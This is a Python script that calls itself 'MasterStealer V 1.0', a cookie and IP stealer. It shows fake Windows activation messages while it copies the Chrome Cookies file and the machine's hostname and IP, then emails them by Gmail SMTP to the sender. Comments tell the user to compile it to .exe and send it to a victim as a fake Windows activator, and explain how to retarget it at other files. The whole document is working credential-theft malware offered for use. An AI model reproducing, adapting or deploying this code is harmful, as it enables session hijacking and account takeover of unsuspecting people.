########################## Need To run from desktop

import os
import socket
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
# Function to check is cookies file present in the current dir
def fetch_result(x):
    if "Cookies" in finding_cookies:
        result = "Result: Pass"
        return result
    else:
        result = "Result: Failed"
        return result
                                                    #IP Part
print(" Trying To Activate Window... ")
# Getting hostname, IPaddress -----
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
# print("Your Computer Name is:" + hostname) -- print if script not working
# print("Your Computer IP Address is:" + IPAddr) -- """"""""

                                                   #Cookie Fetching Part
path1 = os.getcwd()
path2 = os.getcwd()
path_split = path2.split("\\")
drive_path = path_split[0]
user_path = path_split[1]
user_name = path_split[2]
cookies_path = os.chdir(f"{drive_path}/{user_path}/{user_name}/AppData/Local/Google/Chrome/User Data/Default")
                                                #/AppData/Local/Google/Chrome/User Data/Default") -as this is default for all
print("Trying From Server 1572 ...")
print("#################################")
print("#################################")
# print(os.getcwd())
finding_cookies = os.listdir()
# print(fetch_result(finding_cookies))
chrome_cookies_result = fetch_result(finding_cookies)
print("Trying From Server 1628 ...")
print("#################################")
print("#################################")


                                                  #Email Sending Part
body = f'The Hostname of Client is: {hostname}, IP Address is {IPAddr}, Chrome Cookies: {chrome_cookies_result}'
fromaddr = "senderemail@gmail.com" #---- use gmail bcz I set the gmail server or change the server
toaddr = "reciveremail@gmail.com" #---- I preffer use both same adddress for sending and reciving file
msg  = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = 'Cookies'
msg.attach(MIMEText(body, 'plain'))
filename = 'Cookies'
attachment = open(f"{drive_path}/{user_path}/{user_name}/AppData/Local/Google/Chrome/User Data/Default/Cookies", 'rb')
p = MIMEBase('application', 'octet-stream')
p.set_payload((attachment).read())
encoders.encode_base64(p)
p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
msg.attach(p)
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login(fromaddr, "password")
text = msg.as_string()
s.sendmail(fromaddr, toaddr, text)
s.quit()

print("Trying From Server 6873")
print("#################################")
print("#################################")
print("Activation Failed...")


                                                                       #Note
# Before sending it to victim add your email and password then convert it into .exe format and send to victiom
# Fake base ------------- Windows Activator
# I am using gmail server if you want to use another email change the server and port
# All print statments are in comment bcz these are only for testing the script where is error coming dont uncomment if wokring properly
# If you want to steal another file AND you know the path of file just change the path
                                                                    #Limitation
# Need to run from desktop as currently i dont know who to simply deep search
# Currently Stealing Chrome Cookies

                                                                    #Advantage from running dekstop
# as we run from dekstop we need not to worry about in which drive windows is installed

                           #                      MasterGhost

#                          #Cookie and IP stealer   MasterStealer V 1.0


